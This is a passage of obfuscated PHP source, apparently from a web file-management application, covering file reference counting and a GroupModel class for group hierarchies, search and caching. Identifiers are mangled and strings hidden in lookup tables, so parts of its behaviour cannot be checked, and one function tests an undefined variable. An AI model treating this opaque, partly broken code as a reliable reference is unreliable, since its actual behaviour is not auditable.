$“‡çŸÇ) { $õÔ¬Ê½Â =& $_SERVER[¤·²È‰º]; if (!$âÖ¼¢†°) { return; } if (!is_array($âÖ¼¢†°)) { $âÖ¼¢†° = array($âÖ¼¢†°); } $ò€ˆîáË = array(); foreach ($âÖ¼¢†° as $ß½ˆ¦Æ›) { $ä†ñ¾Á” = $ß½ˆ¦Æ› . $õÔ¬Ê½Â[12]; if (!$ò€ˆîáË[$ä†ñ¾Á”]) { $ò€ˆîáË[$ä†ñ¾Á”] = 0; } $ò€ˆîáË[$ä†ñ¾Á”]++; } $‘áçÔ¯Ì = array(); foreach ($ò€ˆîáË as $ß½ˆ¦Æ› => $£¡Áƒµû) { $ä†ñ¾Á” = $£¡Áƒµû . $õÔ¬Ê½Â[12]; if (!$‘áçÔ¯Ì[$ä†ñ¾Á”]) { $‘áçÔ¯Ì[$ä†ñ¾Á”] = array(); } $‘áçÔ¯Ì[$ä†ñ¾Á”][] = $ß½ˆ¦Æ›; } foreach ($‘áçÔ¯Ì as $£¡Áƒµû => $Ø®ı¥ã) { if (!$Ø®ı¥ã) { continue; } $£¡Áƒµû = $“‡çŸÇ ? $£¡Áƒµû : -intval($£¡Áƒµû); $—‚ÛÄàÒ = array($õÔ¬Ê½Â[476] => array($õÔ¬Ê½Â[7], $Ø®ı¥ã)); if ($£¡Áƒµû < 0) { $—‚ÛÄàÒ[$õÔ¬Ê½Â[1891]] = array($õÔ¬Ê½Â[1009], abs($£¡Áƒµû)); } $this->where($—‚ÛÄàÒ)->setAdd($õÔ¬Ê½Â[1891], $£¡Áƒµû); } } public function findByHash($ÀÉíãÕ, $˜ÔØîŠÏ = false) { $êÎóäœ„ =& $_SERVER[¤·²È‰º]; if (!$ÀÉíãÕ && !$˜ÔØîŠÏ) { return !1; } $ï§Üº§È = array($êÎóäœ„[1885] => $ÀÉíãÕ); if ($˜ÔØîŠÏ) { $ï§Üº§È = array($êÎóäœ„[1886] => $˜ÔØîŠÏ); } return $this->order($êÎóäœ„[1892])->where($ï§Üº§È)->find(); } public function clearEmpty($Äí¹â®ø = 0) { $·„àÄ³ =& $_SERVER[¤·²È‰º]; $”ˆ±¸ä = time() - 3600 * 24 * $Äí¹â®ø; $»»ç°€› = $·„àÄ³[1893] . $”ˆ±¸ä; $®²ØóÎ¤ = $this->where($»»ç°€›)->select(); if (!$®²ØóÎ¤) { return; } $ğ²àü = new Task($·„àÄ³[1894], $·„àÄ³[12], count($®²ØóÎ¤)); foreach ($®²ØóÎ¤ as $¦ŒÁçÙ) { $ğ²àü->update(1); $this->resetFile($¦ŒÁçÙ); } $ğ²àü->end(); } public function resetFile($É™ë³‡) { $”ŒèàÛ =& $_SERVER[¤·²È‰º]; $·‘µÎâÓ = array($”ŒèàÛ[477] => $É™ë³‡[$”ŒèàÛ[476]]); $Å¡ß÷ğ‡ = Model($”ŒèàÛ[1321])->where($·‘µÎâÓ)->count(); $ŒŠ‡²£Å = Model($”ŒèàÛ[1895])->where($·‘µÎâÓ)->count(); $Ğ¶º™ş = intval($Å¡ß÷ğ‡) + intval($ŒŠ‡²£Å); if ($Ğ¶º™ş == 0) { IO::remove($É™ë³‡[$”ŒèàÛ[94]]); Model($”ŒèàÛ[1896])->delete($É™ë³‡[$”ŒèàÛ[476]]); $this->where($·‘µÎâÓ)->delete(); $this->metaSet($É™ë³‡[$”ŒèàÛ[476]], null, null); return; } if ($É™ë³‡[$”ŒèàÛ[1891]] != $Ğ¶º™ş) { $this->where($·‘µÎâÓ)->save(array($”ŒèàÛ[1884] => $Ğ¶º™ş)); } } public function storageInfo($ı‰Ó³ = false) { $Î±¼Üì =& $_SERVER[¤·²È‰º]; $¯Õèñë¼ = $this->count() + 0.0; $Ú¬œÚã = 0; $à“ÄàöØ = 1; $¨ ôâ® = 0; $Üœ–¯¼ö = 5000; for ($¨¤™”ÕÚ = 0; $¨¤™”ÕÚ < $¯Õèñë¼; $¨¤™”ÕÚ = $¨¤™”ÕÚ + $Üœ–¯¼ö) { $È¬ÚôåË = $this->limit($¨¤™”ÕÚ, $¨¤™”ÕÚ + $Üœ–¯¼ö)->select(); foreach ($È¬ÚôåË as $å³‡Ö›’) { $à“ÄàöØ += $å³‡Ö›’[$Î±¼Üì[86]] * $å³‡Ö›’[$Î±¼Üì[1891]]; $Ú¬œÚã += $å³‡Ö›’[$Î±¼Üì[86]] * ($å³‡Ö›’[$Î±¼Üì[1891]] - 1); $¨ ôâ® += $å³‡Ö›’[$Î±¼Üì[1891]]; } } $ïÃÄ²™È = array($Î±¼Üì[1897] => $à“ÄàöØ, $Î±¼Üì[1898] => $Ú¬œÚã, $Î±¼Üì[1899] => $Ú¬œÚã / $à“ÄàöØ, $Î±¼Üì[90] => $¯Õèñë¼, $Î±¼Üì[1900] => $¨ ôâ®); return $ïÃÄ²™È; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\145" => "\147\162\x6f\165\160\x5f\x6d\x65\x74\141", "\x6d\145\164\x61\106\151\x65\154\x64" => "\147\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($Ò¼­ù¼) { $©í…Îşæ =& $_SERVER[¤·²È‰º]; return array($©í…Îşæ[1901] => array($Ò¼­ù¼[0], $©í…Îşæ[1902]), $©í…Îşæ[1903] => array($Ò¼­ù¼[0], $©í…Îşæ[1904])); } protected function getInfo($¹öüŒ¨, $öÔ¶ĞÕÖ = false) { $Ş†£¢âÖ = $this->getInfoSimple($¹öüŒ¨); if (!$Ş†£¢âÖ) { return !1; } if ($öÔ¶ĞÕÖ) { return $this->_listDataApplyItem($Ş†£¢âÖ); } return $this->cacheFunctionGet($_SERVER[¤·²È‰º][1905], $¹öüŒ¨); } protected function getInfoSimple($ÁõØĞ¸», $ïŒÚ… = false) { $¸Œ‡ò·­ =& $_SERVER[¤·²È‰º]; if ($ïŒÚ…) { $çæ«„ ª = array($¸Œ‡ò·­[1823] => intval($ÁõØĞ¸»)); $ÙÇÄæ˜ = $this->where($çæ«„ ª)->find(); return is_array($ÙÇÄæ˜) ? $ÙÇÄæ˜ : array(); } return $this->cacheFunctionGet($¸Œ‡ò·­[1906], $ÁõØĞ¸»); } protected function groupAdd($Íƒµ´œ) { $•©ıß«à =& $_SERVER[¤·²È‰º]; if (!$Íƒµ´œ[$•©ıß«à[440]] && isset($Íƒµ´œ[$•©ıß«à[1823]]) && $Íƒµ´œ[$•©ıß«à[1823]] == 1) { if ($¡ê­éÃ = $this->getInfoSimple($Íƒµ´œ[$•©ıß«à[1823]], !0)) { return $Íƒµ´œ[$•©ıß«à[1823]]; } } else { $¡ê­éÃ = $this->getInfoSimple($Íƒµ´œ[$•©ıß«à[440]]); if (!$¡ê­éÃ) { return !1; } } $ò³¿ˆ“¸ = $•©ıß«à[539]; if ($¡ê­éÃ[$•©ıß«à[529]]) { $ò³¿ˆ“¸ = $¡ê­éÃ[$•©ıß«à[529]] . $¡ê­éÃ[$•©ıß«à[1823]] . $•©ıß«à[60]; } $Å²…ÍÏ¢ = array($•©ıß«à[428] => $this->groupNameAuto($Íƒµ´œ[$•©ıß«à[440]], $Íƒµ´œ[$•©ıß«à[42]]), $•©ıß«à[409] => $Íƒµ´œ[$•©ıß«à[440]], $•©ıß«à[598] => $ò³¿ˆ“¸, $•©ıß«à[1907] => $Íƒµ´œ[$•©ıß«à[1810]], $•©ıß«à[1908] => 0, $•©ıß«à[1827] => 0); if (isset($Íƒµ´œ[$•©ıß«à[1847]])) { $Å²…ÍÏ¢[$•©ıß«à[1847]] = $Íƒµ´œ[$•©ıß«à[1847]]; } else { $˜öºâ£ = $this->max($•©ıß«à[1847]); if (!$˜öºâ£) { $˜öºâ£ = 0; } $Å²…ÍÏ¢[$•©ıß«à[1847]] = $˜öºâ£ + 1; } if (!empty($Íƒµ´œ[$•©ıß«à[1823]])) { $Å²…ÍÏ¢[$•©ıß«à[1823]] = $Íƒµ´œ[$•©ıß«à[1823]]; } $ˆß¬”î = $this->add($Å²…ÍÏ¢); $this->setNamePinyin($ˆß¬”î, $Å²…ÍÏ¢[$•©ıß«à[42]]); if (isset($Íƒµ´œ[$•©ıß«à[1909]])) { $this->metaSet($ˆß¬”î, array($•©ıß«à[1909] => $Íƒµ´œ[$•©ıß«à[1909]], $•©ıß«à[1910] => $Íƒµ´œ[$•©ıß«à[1910]])); unset($Íƒµ´œ[$•©ıß«à[1909]]); unset($Íƒµ´œ[$•©ıß«à[1910]]); } Model($•©ıß«à[1321])->groupRootAdd($ˆß¬”î); return $ˆß¬”î; } protected function groupEdit($ÅéÁ•Øç, $Şõ³™) { $‚‘×ùİÙ =& $_SERVER[¤·²È‰º]; $Òß»œù = $this->getInfoSimple($ÅéÁ•Øç); if (!$Òß»œù) { return !1; } if (!empty($Şõ³™[$‚‘×ùİÙ[440]])) { $¾ÏôÚµ = $this->getInfoSimple($Şõ³™[$‚‘×ùİÙ[440]]); if (!$¾ÏôÚµ) { return !1; } if ($Òß»œù[$‚‘×ùİÙ[1823]] == $¾ÏôÚµ[$‚‘×ùİÙ[1823]]) { return !1; } if ($Şõ³™[$‚‘×ùİÙ[440]] != $Òß»œù[$‚‘×ùİÙ[440]]) { if ($¾ÏôÚµ[$‚‘×ùİÙ[529]] !== $Òß»œù[$‚‘×ùİÙ[529]] && strpos($¾ÏôÚµ[$‚‘×ùİÙ[529]], $Òß»œù[$‚‘×ùİÙ[529]] . $Òß»œù[$‚‘×ùİÙ[1823]] . $‚‘×ùİÙ[60]) === 0) { return !1; } $Şõ³™[$‚‘×ùİÙ[598]] = $¾ÏôÚµ[$‚‘×ùİÙ[529]] . $Şõ³™[$‚‘×ùİÙ[440]] . $‚‘×ùİÙ[60]; $this->_changeChildLevel($Òß»œù, $¾ÏôÚµ); } } if (isset($Şõ³™[$‚‘×ùİÙ[42]])) { $this->setNamePinyin($ÅéÁ•Øç, $Şõ³™[$‚‘×ùİÙ[42]]); } if (isset($Şõ³™[$‚‘×ùİÙ[1909]])) { $this->metaSet($ÅéÁ•Øç, array($‚‘×ùİÙ[1909] => $Şõ³™[$‚‘×ùİÙ[1909]], $‚‘×ùİÙ[1910] => $Şõ³™[$‚‘×ùİÙ[1910]])); unset($Şõ³™[$‚‘×ùİÙ[1909]]); unset($Şõ³™[$‚‘×ùİÙ[1910]]); } $this->_clearChildrenCache($Òß»œù); return $this->where(array($‚‘×ùİÙ[1911] => $ÅéÁ•Øç))->save($Şõ³™); } private function _clearChildrenCache($ì“Ø§„–) { $—Ú¼ûãÔ =& $_SERVER[¤·²È‰º]; $ŒÌÏËğ² = array($—Ú¼ûãÔ[598] => array($—Ú¼ûãÔ[558], $ì“Ø§„–[$—Ú¼ûãÔ[529]] . $ì“Ø§„–[$—Ú¼ûãÔ[1823]] . $—Ú¼ûãÔ[559])); $¾¿Š‡¨– = $this->field($—Ú¼ûãÔ[1823])->where($ŒÌÏËğ²)->select(); foreach ($¾¿Š‡¨– as $â˜²úÑ¾) { $this->_clearCache($â˜²úÑ¾[$—Ú¼ûãÔ[1823]]); } } private function _clearCache($ŠÎ¶¦Æ°) { $‚ş•©Õ• =& $_SERVER[¤·²È‰º]; $this->cacheFunctionClear($‚ş•©Õ•[1905], $ŠÎ¶¦Æ°); $this->cacheFunctionClear($‚ş•©Õ•[1906], $ŠÎ¶¦Æ°); } private function _changeChildLevel($æ™»ßë–, $º«“°Ó©, $¹â©»Ùß = false) { $•’Û´Ş =& $_SERVER[¤·²È‰º]; $ñøâ¬æã = $æ™»ßë–[$•’Û´Ş[529]] . $æ™»ßë–[$•’Û´Ş[1823]] . $•’Û´Ş[60]; $ŞØèê¤° = $º«“°Ó©[$•’Û´Ş[529]] . $º«“°Ó©[$•’Û´Ş[1823]] . $•’Û´Ş[60] . $æ™»ßë–[$•’Û´Ş[1823]] . $•’Û´Ş[60]; if ($¹â©»Ùß) { $ŞØèê¤° = $º«“°Ó©[$•’Û´Ş[529]] . $º«“°Ó©[$•’Û´Ş[1823]] . $•’Û´Ş[60]; } $ºŠ¥‹– = array($•’Û´Ş[598] => array($•’Û´Ş[558], $æ™»ßë–[$•’Û´Ş[529]] . $æ™»ßë–[$•’Û´Ş[1823]] . $•’Û´Ş[559])); $‡­ÒÑà… = array($•’Û´Ş[598] => array($•’Û´Ş[607], "\162\x65\x70\x6c\x61\x63\145\x28\160\x61\162\x65\156\164\114\145\x76\x65\154\x2c\47{$ñøâ¬æã}\47\54\x27{$ŞØèê¤°}\47\51")); $this->_clearChildrenCache($æ™»ßë–); $this->where($ºŠ¥‹–)->data($‡­ÒÑà…)->save(); } public function setNamePinyin($‡œÑ§¤×, $ôÌÑ£¤Ğ = false) { $‚²ÃËŞÍ =& $_SERVER[¤·²È‰º]; if (!$ôÌÑ£¤Ğ) { $ÅºÎšè¬ = $this->getInfoSimple($‡œÑ§¤×); $ôÌÑ£¤Ğ = $ÅºÎšè¬[$‚²ÃËŞÍ[42]]; } if (!Input::check($ôÌÑ£¤Ğ, $‚²ÃËŞÍ[601])) { $this->metaSet($‡œÑ§¤×, $‚²ÃËŞÍ[473], null); $this->metaSet($‡œÑ§¤×, $‚²ÃËŞÍ[472], null); return; } $Şñ°š…¬ = array($‚²ÃËŞÍ[473] => str_replace($‚²ÃËŞÍ[63], $‚²ÃËŞÍ[12], Pinyin::get($ôÌÑ£¤Ğ)), $‚²ÃËŞÍ[472] => Pinyin::get($ôÌÑ£¤Ğ, $‚²ÃËŞÍ[602])); $this->metaSet($‡œÑ§¤×, $Şñ°š…¬); } protected function groupStatus($”€Î–ªŞ, $Õõğªòß) { $Ûõï®Ÿ½ =& $_SERVER[¤·²È‰º]; $™¶Ø…š• = $this->getInfoSimple($”€Î–ªŞ); if (!$™¶Ø…š•) { return !1; } if ($Õõğªòß == $Ûõï®Ÿ½[98]) { $Ùõ²Èó = $this->parentLevelArray($™¶Ø…š•[$Ûõï®Ÿ½[529]]); } else { $šÖûƒÆ = array($Ûõï®Ÿ½[598] => array($Ûõï®Ÿ½[558], $™¶Ø…š•[$Ûõï®Ÿ½[529]] . $™¶Ø…š•[$Ûõï®Ÿ½[1823]] . $Ûõï®Ÿ½[559])); $Ùõ²Èó = $this->where($šÖûƒÆ)->field($Ûõï®Ÿ½[1823])->select(); $Ùõ²Èó = array_to_keyvalue($Ùõ²Èó, $Ûõï®Ÿ½[12], $Ûõï®Ÿ½[1823]); } $Ùõ²Èó[] = $™¶Ø…š•[$Ûõï®Ÿ½[1823]]; $¸ĞØƒ˜“ = array(); foreach ($Ùõ²Èó as $”€Î–ªŞ) { $¸ĞØƒ˜“[] = array($Ûõï®Ÿ½[1823] => $”€Î–ªŞ, $Ûõï®Ÿ½[104] => $Ûõï®Ÿ½[751], $Ûõï®Ÿ½[383] => $Õõğªòß); $this->_clearCache($”€Î–ªŞ); } return Model($Ûõï®Ÿ½[1912])->addAll($¸ĞØƒ˜“, array(), !0); } protected function groupRemove($¨ºğ±“ù, $˜î†¨î = false) { $‘†ºÕ„° =& $_SERVER[¤·²È‰º]; $ıâª©÷ = array($‘†ºÕ„°[1823] => $¨ºğ±“ù); $ñÔ÷ø¨õ = $this->where($ıâª©÷)->find(); if (!$ñÔ÷ø¨õ || $ñÔ÷ø¨õ[$‘†ºÕ„°[440]] == 0) { return !1; } if (!$˜î†¨î) { $µ‰è°†ï = $this->getInfoSimple($ñÔ÷ø¨õ[$‘†ºÕ„°[440]]); $this->_changeChildLevel($ñÔ÷ø¨õ, $µ‰è°†ï, !0); $this->where(array($‘†ºÕ„°[440] => $¨ºğ±“ù))->save(array($‘†ºÕ„°[440] => $ñÔ÷ø¨õ[$‘†ºÕ„°[440]])); } Model($‘†ºÕ„°[1912])->where($ıâª©÷)->delete(); Model($‘†ºÕ„°[1913])->where($ıâª©÷)->delete(); Model($‘†ºÕ„°[826])->groupRootRemove($¨ºğ±“ù); return $this->where($ıâª©÷)->delete(); } protected function groupSort($ÖıáóÆ·) { $åÃØæöÛ =& $_SERVER[¤·²È‰º]; $ºñ›µÈ = array(); foreach ($ÖıáóÆ· as $”¦´¾Òö => $‰ô¤§¾‡) { $ºñ›µÈ[] = array($åÃØæöÛ[1823], $‰ô¤§¾‡, $åÃØæöÛ[1847], $”¦´¾Òö + 1); } $this->saveAll($ºñ›µÈ); } public function listData() { $À¶õ“ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($À¶õ“[$_SERVER[¤·²È‰º][378]]); return $À¶õ“; } private function _makeOrder($ÅÆÚ­î = '') { $Ëúúğì— =& $_SERVER[¤·²È‰º]; $Ìà¥Ğ¡ = array($Ëúúğì—[1823], $Ëúúğì—[42], $Ëúúğì—[1812], $Ëúúğì—[210]); $ôÛ™‘©ã = array($Ëúúğì—[458] => $Ëúúğì—[459], $Ëúúğì—[460] => $Ëúúğì—[461]); $î¦¾†›Ö = Input::get($Ëúúğì—[465], $Ëúúğì—[7], $Ëúúğì—[1827], $Ìà¥Ğ¡); $Ü¯îâ‰¦ = Input::get($Ëúúğì—[466], $Ëúúğì—[7], $Ëúúğì—[1914], array($Ëúúğì—[1914], $Ëúúğì—[460])); $Ü¯îâ‰¦ = $ôÛ™‘©ã[$Ü¯îâ‰¦]; $ÅÆÚ­î = $ÅÆÚ­î . "{$î¦¾†›Ö}\x20{$Ü¯îâ‰¦}\x2c\x20\147\x72\x6f\x75\x70\x49\104\40\141\x73\x63"; return $this->order($ÅÆÚ­î); } public function listChild($§»­«öñ) { $È©¾ÍĞæ =& $_SERVER[¤·²È‰º]; $ìõşèÍ = $this->where(array($È©¾ÍĞæ[440] => $§»­«öñ))->_makeOrder()->selectPage(200); $this->_listDataApply($ìõşèÍ[$È©¾ÍĞæ[378]]); return $ìõşèÍ; } public function listChildIds($ì€ö¹Ğ¶) { $Öƒ”ÁÇÃ =& $_SERVER[¤·²È‰º]; if (is_string($ñÀ£ğË§)) { $ì€ö¹Ğ¶ = explode($Öƒ”ÁÇÃ[60], $ì€ö¹Ğ¶); } $ºé¾“€¥ = $this->where(array($Öƒ”ÁÇÃ[1823] => array($Öƒ”ÁÇÃ[7], $ì€ö¹Ğ¶)))->field($Öƒ”ÁÇÃ[1915])->select(); if (!$ºé¾“€¥) { return !1; } $¦Éµş·î = array(); foreach ($ºé¾“€¥ as $¤ñû™°) { $¦Éµş·î[] = "\163\145\x6c\145\143\x74\x20\x67\x72\157\x75\160\111\104\x20\x66\162\157\x6d\x20\x60\x67\162\157\x75\160\140\40\x77\x68\x65\162\145\40\160\x61\162\x65\x6e\164\114\x65\x76\145\x6c\x20\x6c\x69\x6b\145\40\47{$¤ñû™°[$Öƒ”ÁÇÃ[529]]}{$¤ñû™°[$Öƒ”ÁÇÃ[1823]]}\x2c\x25\x27"; } $¦Éµş·î = implode($Öƒ”ÁÇÃ[1916], $¦Éµş·î); $ºé¾“€¥ = $this->query($¦Éµş·î); if (!$ºé¾“€¥) { return array(); } $ì€ö¹Ğ¶ = array_to_keyvalue($ºé¾“€¥, $Öƒ”ÁÇÃ[12], $Öƒ”ÁÇÃ[1823]); return array_unique($ì€ö¹Ğ¶); } public function listByID($áœ·ƒû) { $óÔ“Û½ =& $_SERVER[¤·²È‰º]; if (!$áœ·ƒû) { return array(); } $ŠÚÏŞÖò = array($óÔ“Û½[1823] => array($óÔ“Û½[7], $áœ·ƒû)); $°š„Ş´ = $this->where($ŠÚÏŞÖò)->select(); $°š„Ş´ = array_sort_keep($°š„Ş´, $óÔ“Û½[1823], $áœ·ƒû); $this->_listDataApply($°š„Ş´); return $°š„Ş´; } public function listSearch($¶è²ü‚ı) { $­»²× Ì =& $_SERVER[¤·²È‰º]; $“İØïÒ‡ = $¶è²ü‚ı[$­»²× Ì[1917]]; $‹Äƒ¾Ÿ  = isset($¶è²ü‚ı[$­»²× Ì[1918]]) ? $¶è²ü‚ı[$­»²× Ì[1918]] : !1; if (!trim($“İØïÒ‡)) { return !1; } $“İØïÒ‡ = str_replace($­»²× Ì[1919], $­»²× Ì[1920], $“İØïÒ‡); $ê²¸Ïˆ’ = array($­»²× Ì[1823] => array($­»²× Ì[391], "{$“İØïÒ‡}\45"), $­»²× Ì[42] => array($­»²× Ì[391], "\x25{$“İØïÒ‡}\45"), $­»²× Ì[994] => $­»²× Ì[1921]); if ($‹Äƒ¾Ÿ ) { $×ü®ÏĞµ = $this->getInfoSimple($‹Äƒ¾Ÿ ); $¿öı÷‰Ş = $×ü®ÏĞµ[$­»²× Ì[529]] . $‹Äƒ¾Ÿ  . $­»²× Ì[559]; $ê²¸Ïˆ’ = array($ê²¸Ïˆ’, array($­»²× Ì[529] => array($­»²× Ì[391], $¿öı÷‰Ş))); } $ê²¸Ïˆ’ = $this->parseWhereLike($ê²¸Ïˆ’); $…¬ÀÃÇ = $this->_makeOrder()->where($ê²¸Ïˆ’)->selectPage(20); $…¬ÀÃÇ = $…¬ÀÃÇ ? $…¬ÀÃÇ : array($­»²× Ì[378] => array(), $­»²× Ì[375] => array()); if (!$…¬ÀÃÇ || count($…¬ÀÃÇ[$­»²× Ì[378]]) < 5 && Input::check($“İØïÒ‡, $­»²× Ì[327])) { $Û±ù€û£ = $this->groupChildrenAll($‹Äƒ¾Ÿ ); $İÂâı« = $this->_searchFromMeta($­»²× Ì[472], $“İØïÒ‡, 10, $Û±ù€û£); $„ãş¾½ = $this->_searchFromMeta($­»²× Ì[473], $“İØïÒ‡, 10, $Û±ù€û£); $³Äâš• = array_merge($İÂâı«, $„ãş¾½, $…¬ÀÃÇ[$­»²× Ì[378]]); $…¬ÀÃÇ[$­»²× Ì[378]] = array_unique_by_key($³Äâš•, $­»²× Ì[1823]); $…¬ÀÃÇ[$­»²× Ì[375]][$­»²× Ì[376]] = count($…¬ÀÃÇ[$­»²× Ì[378]]); $…¬ÀÃÇ[$­»²× Ì[375]][$­»²× Ì[377]] = ceil($…¬ÀÃÇ[$­»²× Ì[375]][$­»²× Ì[376]] / $…¬ÀÃÇ[$­»²× Ì[375]][$­»²× Ì[372]]); } $this->_listDataApply($…¬ÀÃÇ[$­»²× Ì[378]]); return $…¬ÀÃÇ; } protected function groupChildrenAll($â¶ò¤üÜ) { $Îù­¬› =& $_SERVER[¤·²È‰º]; if (!$â¶ò¤üÜ) { return !1; } if (is_string($â¶ò¤üÜ)) { $â¶ò¤üÜ = array($â¶ò¤üÜ); } $¸é£äˆ× = $â¶ò¤üÜ; foreach ($â¶ò¤üÜ as $†µ¡Éó) { $ß„±¦ = $this->getInfoSimple($†µ¡Éó); $ˆ•ŒæËˆ = array($Îù­¬›[529] => array($Îù­¬›[391], $ß„±¦[$Îù­¬›[529]] . $†µ¡Éó . $Îù­¬›[559])); $ÑÁ¯Ê±˜ = $this->field($Îù­¬›[1823])->where($ˆ•ŒæËˆ)->select(); $¸é£äˆ× = array_merge($¸é£äˆ×, array_to_keyvalue($ÑÁ¯Ê±˜, $Îù­¬›[12], $Îù­¬›[1823])); } return array_unique($¸é£äˆ×); } private function _searchFromMeta($¤ì½İ‡¾, $ÊÕ¸²û¡, $ôÉæ€õ, $¡µ¨£¸Ÿ) { $óªÚáóá =& $_SERVER[¤·²È‰º]; $ÊÕ¸²û¡ = strtolower($ÊÕ¸²û¡); $¢àªÑÜƒ = array($óªÚáóá[104] => $¤ì½İ‡¾, $óªÚáóá[383] => array($óªÚáóá[391], "\45{$ÊÕ¸²û¡}\45")); $¢àªÑÜƒ = $this->parseWhereLike($¢àªÑÜƒ); if ($¡µ¨£¸Ÿ) { $¢àªÑÜƒ[$óªÚáóá[1823]] = array($óªÚáóá[7], $¡µ¨£¸Ÿ); } $ÑÓÍÈ²” = Model($óªÚáóá[1922])->where($¢àªÑÜƒ)->limit($ôÉæ€õ)->select(); if (!$ÑÓÍÈ²”) { return array(); } $ÑÓÍÈ²” = array_to_keyvalue($ÑÓÍÈ²”, $óªÚáóá[12], $óªÚáóá[1823]); $Ïêµ„×— = $this->where(array($óªÚáóá[1911] => array($óªÚáóá[7], $ÑÓÍÈ²”)))->select(); if (!$Ïêµ„×—) { return array(); } return $Ïêµ„×—; } protected function _listDataApplyItem($Ïû®Éóæ) { $ùß¼ƒû¥ = array($Ïû®Éóæ); $this->_listDataApply($ùß¼ƒû¥); return $ùß¼ƒû¥[0]; } protected function _listDataApply(&$š†´Ë¯Ü) { $€º±´œŸ =& $_SERVER[¤·²È‰º]; if (!$š†´Ë¯Ü) { return; } $¢¼™¾“ = array_to_keyvalue($š†´Ë¯Ü, $€º±´œŸ[12], $€º±´œŸ[1823]); $this->_listAppendChildren($š†´Ë¯Ü); $this->_listAppendChildrenMember($š†´Ë¯Ü); $this->_listAppendMeta($š†´Ë¯Ü, $¢¼™¾“); $this->_listAppendParent($š†´Ë¯Ü); $this->_listAppendSourceRoot($š†´Ë¯Ü, $¢¼™¾“); } private function _listAppendChildren(&$õíìÃş£) { $ªŒ‚Å†¹ =& $_SERVER[¤·²È‰º]; $¦Ş¨š Ò = array_to_keyvalue($õíìÃş£, $ªŒ‚Å†¹[12], $ªŒ‚Å†¹[1823]); $ÄÆÎ¥ü = array($ªŒ‚Å†¹[440] => array($ªŒ‚Å†¹[7], $¦Ş¨š Ò)); $ĞãÚÓõ = array($ªŒ‚Å†¹[440], $ªŒ‚Å†¹[1923] => $ªŒ‚Å†¹[508]); $Ò“Ö¥¢ = $this->field($ĞãÚÓõ)->where($ÄÆÎ¥ü)->group($ªŒ‚Å†¹[440])->select(); $ö†¼«øÔ = array_to_keyvalue($Ò“Ö¥¢, $ªŒ‚Å†¹[440], $ªŒ‚Å†¹[508]); foreach ($õíìÃş£ as &$¡ŞáµâŸ) { $ÌŒÙæ¹ = $¡ŞáµâŸ[$ªŒ‚Å†¹[1823]]; $¡ŞáµâŸ[$ªŒ‚Å†¹[1924]] = isset($ö†¼«øÔ[$ÌŒÙæ¹]) ? intval($ö†¼«øÔ[$ÌŒÙæ¹]) : !1; } unset($¡ŞáµâŸ); } private function _listAppendChildrenMember(&$‰´å·¯“) { $æ„â¾Ï¹ =& $_SERVER[¤·²È‰º]; $şŞ¾ğ÷¿ = array_to_keyvalue($‰´å·¯“, $æ„â¾Ï¹[12], $æ„â¾Ï¹[1823]); $÷¼É›à = array($æ„â¾Ï¹[1823] => array($æ„â¾Ï¹[7], $şŞ¾ğ÷¿)); $×ëİ¾ùÇ = array($æ„â¾Ï¹[1823], $æ„â¾Ï¹[1923] => $æ„â¾Ï¹[508]); $ä÷ëüÔ = Model($æ„â¾Ï¹[1913])->field($×ëİ¾ùÇ)->where($÷¼É›à)->group($æ„â¾Ï¹[1823])->select(); $ï·Éë‡å = array_to_keyvalue($ä÷ëüÔ, $æ„â¾Ï¹[1823], $æ„â¾Ï¹[508]); foreach ($‰´å·¯“ as &$Ù¥âÓ»’) { $¹ÖŸí±÷ = $Ù¥âÓ»’[$æ„â¾Ï¹[1823]]; $Ù¥âÓ»’[$æ„â¾Ï¹[1925]] = isset($ï·Éë‡å[$¹ÖŸí±÷]) ? intval($ï·Éë‡å[$¹ÖŸí±÷]) : !1; } unset($Ù¥âÓ»’); } private function _listAppendMeta(&$ı‚Ü ñ¦, $Ä“¹»³³) { $—üÒÂ´Î =& $_SERVER[¤·²È‰º]; $Î÷×Äü = array($—üÒÂ´Î[1823] => array($—üÒÂ´Î[7], $Ä“¹»³³)); $»Š„§ª = Model($—üÒÂ´Î[1912])->where($Î÷×Äü)->select(); $»Š„§ª = array_to_keyvalue_group($»Š„§ª, $—üÒÂ´Î[1823]); foreach ($»Š„§ª as &$Ì¦ó­æÌ) { $Ì¦ó­æÌ = array_to_keyvalue($Ì¦ó­æÌ, $—üÒÂ´Î[104], $—üÒÂ´Î[383]); } unset($Ì¦ó­æÌ); foreach ($ı‚Ü ñ¦ as &$‡‘‘ä³) { $‡‘‘ä³[$—üÒÂ´Î[474]] = array(); if (isset($»Š„§ª[$‡‘‘ä³[$—üÒÂ´Î[1823]]])) { $‡‘‘ä³[$—üÒÂ´Î[474]] = $»Š„§ª[$‡‘‘ä³[$—üÒÂ´Î[1823]]]; } } unset($‡‘‘ä³); } protected function parentLevelArray($¼öÌèÖ) { $µ„Œôã¢ =& $_SERVER[¤·²È‰º]; $¼öÌèÖ = explode($µ„Œôã¢[60], trim($¼öÌèÖ, $µ„Œôã¢[60])); $¼öÌèÖ = array_remove_value($¼öÌèÖ, $µ„Œôã¢[207]); return $¼öÌèÖ; } protected function parentInGroup($ØğñÍà, $©·£İíë) { $õ·Çß¢ƒ =& $_SERVER[¤·²È‰º]; $ÕÓşØ˜É = $this->getInfoSimple($ØğñÍà); if (!$ÕÓşØ˜É) { return !0; } $ªåÕƒ‚ = $this->parentLevelArray($ÕÓşØ˜É[$õ·Çß¢ƒ[529]]); $ªåÕƒ‚[] = $ØğñÍà; foreach ($ªåÕƒ‚ as $ØğñÍà) { if (in_array($ØğñÍà . $õ·Çß¢ƒ[12], $©·£İíë)) { return !0; } } return !1; } private function _listAppendParent(&$‰ƒ¿Ó¤) { $É¸óí´Š =& $_SERVER[¤·²È‰º]; $²ğÕâòÜ = array(); foreach ($‰ƒ¿Ó¤ as &$¸“¾ù·ì) { $²ğÕâòÜ[$¸“¾ù·ì[$É¸óí´Š[1823]]] = $¸“¾ù·ì[$É¸óí´Š[42]]; $‡šæû‡ = $this->parentLevelArray($¸“¾ù·ì[$É¸óí´Š[529]]); foreach ($‡šæû‡ as $çÓåİçµ) { if (!isset($²ğÕâòÜ[$çÓåİçµ])) { $²ğÕâòÜ[$çÓåİçµ] = 0; } } } unset($¸“¾ù·ì); foreach ($²ğÕâòÜ as $¸şƒÒı– => $Ï¶áÊ¹ı) { if ($Ï¶áÊ¹ı) { continue; } $ì£Ç†£· = 